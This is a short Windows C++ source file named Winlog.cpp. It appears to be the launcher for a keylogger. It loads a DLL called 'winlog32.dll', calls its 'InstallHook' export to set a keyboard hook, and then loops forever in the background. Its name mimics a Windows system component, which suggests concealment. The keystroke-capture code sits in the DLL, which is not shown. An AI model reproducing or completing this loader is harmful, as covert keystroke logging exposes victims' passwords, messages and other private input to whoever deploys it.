// Winlog.cpp : Defines the entry point for the application.
//

#include "stdafx.h"

int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
	
	static HINSTANCE hinstDLL=NULL; 
	typedef BOOL (*kbhook)(); //	typedef BOOL (*desthook)(); 

	kbhook HookKeyboard;
	hinstDLL = LoadLibrary((LPCTSTR) "winlog32.dll"); 

	if(hinstDLL == NULL)
	{
		MessageBox(NULL,"Could not load DLL","Error",MB_OK);
		return -1;
	}
	HookKeyboard = (kbhook)GetProcAddress(hinstDLL, "InstallHook"); 

	if(HookKeyboard==NULL)
	{
		MessageBox(NULL,"Could not load Hook function from DLL","Error",MB_OK);
		return -1;
	}

	HookKeyboard();	
	while(1)
	{
		Sleep(60000);
	}
	return 0;
}



